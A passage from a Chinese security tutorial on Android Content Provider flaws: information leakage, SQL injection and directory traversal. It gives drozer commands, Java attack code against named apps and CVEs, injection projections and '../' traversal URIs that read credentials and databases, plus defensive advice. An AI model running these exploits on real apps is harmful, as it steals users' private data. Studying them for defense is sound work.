ContentUris.withAppendedId(uri, <span class="number">2</span>);</span><br><span class="line">resolver.delete(deleteIdUri, <span class="literal">null</span>, <span class="literal">null</span>);</span><br></pre></td></tr></table></figure><p><strong>监听数据变化：</strong></p><p>如果ContentProvider的访问者需要知道数据发生的变化，可以在ContentProvider发生数据变化时调用getContentResolver().notifyChange(uri, null)来通知注册在此URI上的访问者。只给出类中监听部分的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyProvider</span> <span class="keyword">extends</span> <span class="title class_">ContentProvider</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> Uri <span class="title function_">insert</span><span class="params">(Uri uri, ContentValues values)</span> &#123;</span><br><span class="line">     db.insert(<span class="string">&quot;tablename&quot;</span>, <span class="string">&quot;tablenameid&quot;</span>, values);</span><br><span class="line">      getContext().getContentResolver().notifyChange(uri, <span class="literal">null</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而访问者必须使用ContentObserver对数据（数据采用uri描述）进行监听，当监听到数据变化通知时，系统就会调用ContentObserver的onChange()方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">getContentResolver().registerContentObserver(Uri.parse(<span class="string">&quot;content://com.ljq.providers.personprovider/person&quot;</span>),</span><br><span class="line">        <span class="literal">true</span>, <span class="keyword">new</span> <span class="title class_">PersonObserver</span>(<span class="keyword">new</span> <span class="title class_">Handler</span>()));</span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PersonObserver</span> <span class="keyword">extends</span> <span class="title class_">ContentObserver</span>&#123;</span><br><span class="line">     <span class="keyword">public</span> <span class="title function_">PersonObserver</span><span class="params">(Handler handler)</span> &#123;</span><br><span class="line">       <span class="built_in">super</span>(handler);</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onChange</span><span class="params">(<span class="type">boolean</span> selfChange)</span> &#123;</span><br><span class="line">        <span class="comment">//to do something</span></span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h3 id="（6）Content-Provider使用"><a href="#（6）Content-Provider使用" class="headerlink" title="（6）Content Provider使用"></a>（6）Content Provider使用</h3><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/6.png" alt="image-20210922094010216"></p><p>创建内容提供者的基本流程：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>）创建一个扩展ContentProviderbaseclass的 Content Provider 类</span><br><span class="line">（<span class="number">2</span>）定义将用于访问内容的内容提供者 URI 地址</span><br><span class="line">（<span class="number">3</span>）创建自己的数据库来保存内容。通常，Android 使用 SQLite 数据库，框架需要覆盖onCreate()方法，该方法将使用 SQLite Open Helper 方法创建或打开提供者的数据库。当您的应用程序启动时，其每个内容提供程序的onCreate()处理程序在主应用程序线程上被调用</span><br><span class="line">（<span class="number">4</span>）实现内容提供者查询以执行不同的数据库特定操作</span><br><span class="line">（<span class="number">5</span>）最后使用 &lt;provider&gt; 标签在您的活动文件中注册您的内容提供者</span><br></pre></td></tr></table></figure><h3 id="2-Content-Provider漏洞的种类和危害"><a href="#2-Content-Provider漏洞的种类和危害" class="headerlink" title="2.Content Provider漏洞的种类和危害"></a>2.Content Provider漏洞的种类和危害</h3><p>Content Provoder漏洞大致可以分为：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/7.png" alt="image-20210922104352070"></p><p>Content Provider漏洞的危害：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Android中Content Provider起到在不同的进程APP之间实现共享数据的作用，通过Binder进程间通信机制以及匿名共享内存机制来实现，但是考虑到数据的安全性，我们需要设置一定的保护权限。</span><br><span class="line">Binder进程间通信机制突破了以应用程序为边界的权限控制，是安全可控的，数据的访问接口由数据的所有者来提供，数据提供方实现安全控制，决定数据的读写操作</span><br><span class="line">而content Provider组件本身提供了读取权限控制，这导致在使用过程中就会存在一些漏洞</span><br></pre></td></tr></table></figure><h2 id="三、Content-Provider漏洞原理分析和复现"><a href="#三、Content-Provider漏洞原理分析和复现" class="headerlink" title="三、Content Provider漏洞原理分析和复现"></a>三、Content Provider漏洞原理分析和复现</h2><h3 id="1-漏洞挖掘方法"><a href="#1-漏洞挖掘方法" class="headerlink" title="1.漏洞挖掘方法"></a>1.漏洞挖掘方法</h3><p>先检测组件的exported属性，再检测组件permission、readPermission、writePermissio对应的protectionlevel，最后再检测sdk版本</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/12.png" alt="image-20210922124628055"></p><h4 id="（1）查找导出Provider"><a href="#（1）查找导出Provider" class="headerlink" title="（1）查找导出Provider"></a>（1）查找导出Provider</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">（1）反编译 apk 文件，在AndroidManifest.xml中查找显示设置了android:exported=&quot;true&quot;Content Provider</span><br><span class="line">（2）使用drozer工具，执行命令：run app.provider.info -a ddns.android.vuls</span><br></pre></td></tr></table></figure><h4 id="（2）查找URI"><a href="#（2）查找URI" class="headerlink" title="（2）查找URI"></a>（2）查找URI</h4><ul><li>反编译apk文件，在代码中查找UriMatcher.addURI，并手动拼接uri</li></ul><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/13.png" alt="image-20210922125010622"></p><p>如上，可以拼接出：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">content:<span class="comment">//ddns.vuls.AccountProvider/account</span></span><br><span class="line">content:<span class="comment">//ddns.vuls.AccountProvider/account/</span></span><br><span class="line">content:<span class="comment">//ddns.vuls.AccountProvider/account/1</span></span><br><span class="line">content:<span class="comment">//ddns.vuls.AccountProvider/account/aaa</span></span><br></pre></td></tr></table></figure><ul><li>使用drozer工具</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">执行命令 run app.provider.finduri ddns.android.vuls</span><br></pre></td></tr></table></figure><h4 id="（3）方法使用"><a href="#（3）方法使用" class="headerlink" title="（3）方法使用"></a>（3）方法使用</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>使用adb shell查询 </span><br><span class="line">例子：adb shell content query --uri 具体uri</span><br><span class="line"><span class="number">2.</span>使用drozer验证</span><br><span class="line">例子：run app.provider.query <span class="string">&quot;具体uri&quot;</span></span><br><span class="line"><span class="number">3.</span>编写目标代码</span><br><span class="line">例如：</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">getyouni</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    ContentResolver contentresolver=getContentResolver();</span><br><span class="line">    String[] projection=&#123;<span class="string">&quot;* from contacts--&quot;</span>&#125;;</span><br><span class="line">    <span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span>Uri.parse(<span class="string">&quot;content://com.snda.youni.providers.DataStructs/message_ex&quot;</span>);</span><br><span class="line">    Cursor cursor=contentresolver.query(uri.projection,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>);</span><br><span class="line">    String text=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">while</span>(cursor.moveToNext())&#123;</span><br><span class="line">        text+=cursor.getString(cursor.getColumnIndex(<span class="string">&quot;display_name&quot;</span>))+<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Log.i(<span class="string">&quot;TEST&quot;</span>,text);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们下面将结合这三种方法来对一些常见的案例进行漏洞挖掘介绍</p><h3 id="2-信息泄露漏洞"><a href="#2-信息泄露漏洞" class="headerlink" title="2.信息泄露漏洞"></a>2.信息泄露漏洞</h3><h4 id="（1）原理介绍"><a href="#（1）原理介绍" class="headerlink" title="（1）原理介绍"></a>（1）原理介绍</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content URI是一个标志provider中的数据的URI。Content URI中包含了整个provider的以符号表示的名字(它的authority)和指向一个表的名字(一个路径)。当你调用一个客户端的方法来操作一个，provider中的一个表，指向表的contentURI是参数之一，如果对ContentProvider的权限没有做好控制，就有可能导致恶意的程序通过这种方式读取APP的敏感数据。</span><br></pre></td></tr></table></figure><h4 id="（2）漏洞复现"><a href="#（2）漏洞复现" class="headerlink" title="（2）漏洞复现"></a>（2）漏洞复现</h4><p><strong>案例1：盛大有你Android存在信息泄露漏洞</strong></p><p>目标代码：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">provider</span> <span class="attr">android:name</span>=<span class="string">&quot;.providers.YouNiProvider&quot;</span> <span class="attr">android:process</span>=<span class="string">&quot;com.snda.youni.mms&quot;</span> <span class="attr">android:authorities</span>=<span class="string">&quot;com.snda.youni.providers.DataStructs&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>攻击代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">getyouni</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    ContentResolver contentresolver=getContentResolver();</span><br><span class="line">    String[] projection=&#123;<span class="string">&quot;* from contacts--&quot;</span>&#125;;</span><br><span class="line">    <span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span>Uri.parse(<span class="string">&quot;content://com.snda.youni.providers.DataStructs/message_ex&quot;</span>);</span><br><span class="line">    Cursor cursor=contentresolver.query(uri.projection,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>);</span><br><span class="line">    String text=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">while</span>(cursor.moveToNext())&#123;</span><br><span class="line">        text+=cursor.getString(cursor.getColumnIndex(<span class="string">&quot;display_name&quot;</span>))+<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Log.i(<span class="string">&quot;TEST&quot;</span>,text);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码分析：</p><p>我们可以分析目标程序的provider的进程名和授权的的URI，我们可以根据授权的URI来构建一个URI，然后通过contentresolver去读取里面的的列表名信息，这样我们就可以获取APP中的隐私数据信息。</p><p><strong>案例2：样例sieve.apk</strong></p><p>我们先向apk中添加一条数据，然后保存：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/8.png" alt="image-20210922111855304"></p><p>我们先使用drozer对内容提供器的路径进行扫描：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run scanner.provider.finduris -a &lt;包名&gt;</span><br></pre></td></tr></table></figure><p>报错：drozer could not find or compile a required extension library</p><p>这是由于我们drozer2.7中代码导致的，我们需要修改相应的代码，参考网址(<a href="https://github.com/FSecureLABS/drozer/issues/361">https://github.com/FSecureLABS/drozer/issues/361</a> )</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/9.png" alt="image-20210922111855304"></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/10.png" alt="image-20210922111855304"></p><p>我们可以对敏感数据读取：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.query uri</span><br></pre></td></tr></table></figure><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/11.png" alt="image-20210922112523603"></p><p>我们就成功的将我们刚才保存的账号密码信息给获取了</p><p>案例3：<a href="https://mabin004.github.io/2019/04/15/Android-Download-Provider%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">CVE-2018-9546: Download Provider文件头信息泄露</a></p><p>漏洞描述：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Download Provider运行app获取下载的http请求头，但理论上APP只能访问自己下载的文件的http请求头，但Download Provider没有做好权限配置，导致heads可以被任意读取。header中会保存一些敏感数据，例如cookie等。</span><br></pre></td></tr></table></figure><p>目标代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">读取header的URI为：content:<span class="comment">//download/mydownloads/download_id/headers</span></span><br></pre></td></tr></table></figure><p>攻击代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span> Uri.parse(<span class="string">&quot;content://download/mydownloads/1493/headers&quot;</span>);</span><br><span class="line"><span class="type">Cursor</span> <span class="variable">cur</span> <span class="operator">=</span> res.query(uri, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (cur != <span class="literal">null</span> &amp;&amp; cur.getCount() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(LOG_SEPARATOR);</span><br><span class="line">        sb.append(<span class="string">&quot;HEADERS FOR DOWNLOAD ID &quot;</span>).append(id).append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span> (cur.moveToNext()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">rowHeader</span> <span class="operator">=</span> cur.getString(cur.getColumnIndex(<span class="string">&quot;header&quot;</span>));</span><br><span class="line">            <span class="type">String</span> <span class="variable">rowValue</span> <span class="operator">=</span> cur.getString(cur.getColumnIndex(<span class="string">&quot;value&quot;</span>));</span><br><span class="line">            sb.append(rowHeader).append(<span class="string">&quot;: &quot;</span>).append(rowValue).append(<span class="string">&quot;\n\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        log(sb.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (cur != <span class="literal">null</span>)</span><br><span class="line">        cur.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于header的URI并未做一些防护措施，我们可以将download_id取具体的值，然后来获取里面的具体信息</p><h4 id="（3）安全防护"><a href="#（3）安全防护" class="headerlink" title="（3）安全防护"></a>（3）安全防护</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>minSdkVersion不低于<span class="number">9</span></span><br><span class="line"><span class="number">2.</span>不向外部app提供数据的私有content provider显示设置exported=”<span class="literal">false</span>”，避免组件暴露(编译api小于<span class="number">17</span>时更应注意此点)</span><br><span class="line"><span class="number">3.</span>内部app通过content provid交换数据时，设置protectionLevel=”signature”验证签名</span><br><span class="line"><span class="number">4.</span>公开的content provider确保不存储敏感数据</span><br><span class="line"></span><br><span class="line">针对权限保护绕过防御措施：</span><br><span class="line"><span class="number">1.</span>使用Context.checkCallingPermission()和Context.enforceCallingPermission()来确保调用者拥有相应的权限，防止串谋攻击(confused deputy)。</span><br><span class="line"><span class="number">2.</span>可以使用如下函数，获取应用的permission保护级别是否与系统中已定义的permission保护级别一致。如果不一致，则抛出异常。</span><br></pre></td></tr></table></figure><h3 id="3-SQL注入漏洞"><a href="#3-SQL注入漏洞" class="headerlink" title="3.SQL注入漏洞"></a>3.SQL注入漏洞</h3><h4 id="（1）原理介绍-1"><a href="#（1）原理介绍-1" class="headerlink" title="（1）原理介绍"></a>（1）原理介绍</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">对Content Provider进行增删改查操作时，程序没有对用户的输入进行过滤，未采用参数化查询的方式，可能会导致sql注入攻击。</span><br><span class="line">所谓的SQL注入攻击指的是攻击者可以精心构造selection参数、projection参数以及其他有效的SQL语句组成部分，实现在未授权的情况下从Content Provider获取更多信息。应该避免使用SQLiteDatabase.rawQuery()进行查询，而应该使用编译好的参数化语句。使用预编译好的语句比如SQLiteStatement，不仅可以避免SQL注入，而且操作性能也大幅提高，因为其不用每次执行都进行解析。</span><br><span class="line">另外一种方式是使用query(),insert(),update(),和delete()方法，因为这些函数也提供了参数化的语句。预编译的参数化语句，问号处可以插入或者使bindString()绑定值。从而避免SQL注入攻击。</span><br></pre></td></tr></table></figure><h4 id="（2）漏洞复现-1"><a href="#（2）漏洞复现-1" class="headerlink" title="（2）漏洞复现"></a>（2）漏洞复现</h4><p><strong>案例1：<a href="http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2014-086899">安全管家客户端存在SQL注入攻击</a></strong></p><p>漏洞说明：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Android版安全管家客户端contentprovider uri配置不当，导致sql注入，使得任何应用可不需要root权限下，获得和修改数据库中数据。</span><br></pre></td></tr></table></figure><p>Androidmanifest文件中定义的provider：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/14.png" alt="image-20210922112523603"></p><p>使用drozer扫描客户端程序存在的contentProvider uri:</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/15.png" alt="image-20210922112523603"></p><p>搜索到对外暴露可访问的uri:</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/16.png" alt="image-20210922112523603"></p><p>newapp.db结构：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/17.png" alt="image-20210922112523603"></p><p>查看新安装应用的包名：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/18.png" alt="image-20210922112523603"></p><p>查看白名单：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/19.png" alt="image-20210922112523603"></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/20.png" alt="image-20210922112523603"></p><p><strong>案例2：样本sieve</strong></p><p>我们使用drozer扫描注入的位置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run scanner.provider.injection -a &lt;包名&gt;</span><br></pre></td></tr></table></figure><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/21.png" alt="image-20210922112523603"></p><p>然后我们执行以下命令，发现返回了报错信息，接着构造sql获取敏感数据</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.query content:<span class="comment">//com.mwr.example.sieve.DBContentProvider/Passwords/ --projection &quot;&#x27;&quot;</span></span><br><span class="line">run app.provider.query content:<span class="comment">//com.mwr.example.sieve.DBContentProvider/Passwords/ --projection &quot; * from Key;--+&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/22.png" alt="image-20210922112523603"></p><p>列出所有表信息：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.query content:<span class="comment">//com.mwr.example.sieve.DBContentProvider/Passwords/ --projection &quot;* FROM SQLITE_MASTER WHERE type=&#x27;table&#x27;;--&quot; </span></span><br></pre></td></tr></table></figure><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/23.png" alt="image-20210922112523603"></p><p>获取具体表信息</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.query content:<span class="comment">//com.mwr.example.sieve.DBContentProvider/Passwords/ --projection &quot;* FROM Key;--&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/24.png" alt="image-20210922112523603"></p><p>列出该app的表信息</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run scanner.provider.sqltables -a  com.mwr.example.sieve</span><br></pre></td></tr></table></figure><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/25.png" alt="image-20210922112523603"></p><p>案例3：<a href="https://mabin004.github.io/2019/04/15/Android-Download-Provider%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">CVE-2018-9493: Download Provider SQL注入</a></p><p>漏洞分析：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Download Provider中的以下columns是不允许被外部访问的，例如CookieData，但是利用SQL注入漏洞可以绕过这个限制。</span><br><span class="line">projection参数存在注入漏洞，结合二分法可以爆出某些columns字段的内容。</span><br></pre></td></tr></table></figure><p>目标代码：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/26.png" alt="image-20210922131649440"></p><p>攻击代码：</p><p>详细可以参考该作者博客：(<a href="https://mabin004.github.io/2019/04/15/Android-Download-Provider%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">https://mabin004.github.io/2019/04/15/Android-Download-Provider%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</a>)</p><h4 id="（3）安全防护-1"><a href="#（3）安全防护-1" class="headerlink" title="（3）安全防护"></a>（3）安全防护</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>实现健壮的服务端校验</span><br><span class="line"><span class="number">2.</span>使用参数化查询语句，比如SQLiteStatement</span><br><span class="line"><span class="number">3.</span>避免使用rawQuery()</span><br><span class="line"><span class="number">4.</span>过滤用户的输入</span><br></pre></td></tr></table></figure><h3 id="4-目录遍历漏洞"><a href="#4-目录遍历漏洞" class="headerlink" title="4.目录遍历漏洞"></a>4.目录遍历漏洞</h3><h4 id="（1）原理介绍-2"><a href="#（1）原理介绍-2" class="headerlink" title="（1）原理介绍"></a>（1）原理介绍</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Android Content Provider存在文件目录遍历安全漏洞，该漏洞源于对外暴露Content Provider组件的应用，没有对Content Provider组件的访问进行权限控制和对访问的目标文件的Content Query Uri进行有效判断，攻击者利用该应用暴露的Content Provider的openFile()接口进行文件目录遍历以达到访问任意可读文件的目的</span><br></pre></td></tr></table></figure><p>漏洞触发的前提条件：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">对外暴露的Content Provider组件实现了openFile()接口</span><br><span class="line">没有对所访问的目标文件Uri进行有效判断，如没有过滤限制如“../”可实现任意可读文件的访问的Content Query Uri</span><br></pre></td></tr></table></figure><h4 id="（2）漏洞复现-2"><a href="#（2）漏洞复现-2" class="headerlink" title="（2）漏洞复现"></a>（2）漏洞复现</h4><p>案例1：<a href="http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2013-044407">赶集网Android客户端Content Provider组件任意文件读取漏洞</a></p><p>漏洞分析：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">赶集网客户端APP的实现中定义了一个可以访问本地文件的Content Provider组件，默认的android:exported=<span class="string">&quot;true&quot;</span>,对应com.ganji.android.jobs.html5.LocalFileContentProvider，该Provider实现了openFile()接口，通过此接口可以访问内部存储app_webview目录下的数据，由于后台未能对目标文件地址进行有效判断，可以通过<span class="string">&quot;../&quot;</span>实现目录跨越，实现对任意私有数据的访问（当然，也可以访问任意外部存储数据，只是我们更关心私有敏感数据）。</span><br></pre></td></tr></table></figure><p>攻击代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">GJContentProviderFileOperations</span><span class="params">()</span>&#123; </span><br><span class="line">    <span class="keyword">try</span>&#123; </span><br><span class="line">    <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> getContentResolver().openInputStream(Uri.parse(<span class="string">&quot;content://com.ganji.html5.localfile.1/webview/../../shared_prefs/userinfo.xml&quot;</span>)); </span><br><span class="line"><span class="type">ByteArrayOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>(); </span><br><span class="line"><span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>]; </span><br><span class="line"><span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> in.read(buffer); </span><br><span class="line"><span class="keyword">while</span>(n&gt;<span class="number">0</span>)&#123; </span><br><span class="line">    out.write(buffer, <span class="number">0</span>, n); </span><br><span class="line">n = in.read(buffer); </span><br><span class="line">Toast.makeText(getBaseContext(), out.toString(), Toast.LENGTH_LONG).show(); </span><br><span class="line">    &#125; </span><br><span class="line">&#125;<span class="keyword">catch</span>(Exception e)&#123; </span><br><span class="line">    debugInfo(e.getMessage()); </span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>案例2：样本sieve</strong></p><p>我们检测文件遍历漏洞：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run scanner.provider.traversal -a &lt;包名&gt;</span><br></pre></td></tr></table></figure><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/27.png" alt="image-20210922131649440"></p><p>我们读取系统文件：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.read content:<span class="comment">//com.mwr.example.sieve.FileBackupProvider/etc/hosts</span></span><br></pre></td></tr></table></figure><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/28.png" alt="image-20210922131649440"></p><p>我们下载系统文件：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.download content:<span class="comment">//com.mwr.example.sieve.FileBackupProvider/data/data/com.mwr.example.sieve/databases/database.db f:/home/database.db</span></span><br></pre></td></tr></table></figure><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/29.png" alt="image-20210922131649440"></p><p>案例3：</p><p>目标代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> String IMAGE_DIRECTORY=localFile.getAbsolutePath();</span><br><span class="line"><span class="keyword">public</span> ParcelFileDescriptor <span 